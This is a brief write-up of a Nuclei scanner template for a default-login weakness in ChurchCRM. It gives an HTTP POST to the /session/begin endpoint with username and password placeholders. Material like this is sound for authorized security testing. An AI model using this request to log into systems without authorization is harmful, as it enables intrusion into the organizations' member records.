# Nuclei Template: ChurchCRM - Default Login
**Template ID:** churchcrm-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`churchcrm-default-login.yaml`)

## Vulnerability Information & PoC

## Description
ChurchCRM contains a default login vulnerability.

## Steps to reproduce / Exploit Payload
```http
POST /session/begin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

User={{username}}&Password={{password}}
```

## References
- https://github.com/ChurchCRM/CRM
